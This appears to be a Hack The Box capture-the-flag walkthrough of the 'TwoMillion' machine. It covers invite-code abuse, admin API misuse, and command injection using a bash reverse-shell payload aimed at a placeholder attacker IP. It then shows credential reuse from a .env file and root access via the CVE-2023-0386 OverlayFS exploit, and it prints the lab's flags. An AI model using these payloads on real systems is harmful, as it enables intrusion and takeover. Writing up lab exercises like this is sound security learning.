# 🛡️ HTB – TwoMillion - Detailed Walkthrough
## 📌 Overview
Room Name: TwoMillion 

Platform: Hack The Box 

Difficulty: Easy 

HTB anniversary machine. Invite code bypass and API abuse lead to RCE, then root via OverlayFS kernel exploit (CVE-2023-0386).

---

## 🔍 1. Reconnaissance & Enumeration
Network Scanning

Initially, I used `rustscan` for fast port discovery followed by `nmap` for service identification 

• Open Ports:

  • `22/tcp`: OpenSSH 8.9p1 

  • `80/tcp`: nginx 

• Domain Setup: Identified a redirect to `2million.htb` and added the entry to `/etc/hosts` 

Web Discovery

• Finding the Invite: Discovered an invite code entry at `/invite` .

• API Analysis: Inspected `/js/inviteapi.js` and found instructions to POST to `/api/v1/invite/generate`  .

• Invite Code: Received an encoded string and decoded it via Base64 to get the valid code. 

---

## 🔓 2. Initial Access & User Flag
API Exploitation & RCE

1. Broken Access Control: Found `/api/v1/admin/auth` and elevated my user to "admin" status  .

2. Command Injection: Identified a vulnerability in the "VPN Connection Test" feature  .

3. Reverse Shell: Used a bash payload to establish a shell as `www-data`.
Payload: `; bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'`


Privilege Escalation: www-data → admin

• Credential Discovery: Found a `.env` file in the web root containing `DB_USERNAME=admin` and `DB_PASSWORD=SuperDuperPass123`  .

• Login: Successfully switched to the admin user using `su admin`  .

• User Flag: Recovered from `/home/admin/user.txt`  .

  • Flag: `c6b6a68343a122c241dabb30606b422f`  

---

## 🚀 3. Post-Exploitation
Internal Reconnaissance

• System Mail: Found an internal mail in `/var/mail/admin` warning about a "nasty" OverlayFS / FUSE vulnerability  .

• System Info: Confirmed the target was running Ubuntu 22.04.2 LTS with Kernel 5.15.70  .

---

## 🏁 4. Privilege Escalation: admin → root (Final)
Kernel Exploitation (CVE-2023-0386)

1. Weaponization: Cloned the CVE-2023-0386 exploit from GitHub  .

2. Build on Target:

  • Transferred the source code as a `.zip` file and unzipped it on the target  .

  • Patched `fuse.c` to include `#include <unistd.h>` to resolve compilation errors  .

  • Successfully compiled using `make all`  .

3. Execution:

  • Mounted the FUSE filesystem: `./fuse ./ovlcap/lower ./gc &`  

  • Executed the exploit: `./exp`  

## 4. Result: Obtained a shell with UID 0 (root)  .

Root Flag:

• Path: `/root/root.txt`  

• Flag: `5f474f5f1d391d3c365131f5efecbb01`  

---

## 💡 Lessons Learned
• Configuration Security: Critical to secure `.env` files and avoid credential re-use  .

• API Integrity: Administrative endpoints must have robust server-side validation  .

• Patch Management: Regular kernel updates are essential to mitigate known Local Privilege Escalation (LPE) vulnerabilities  .
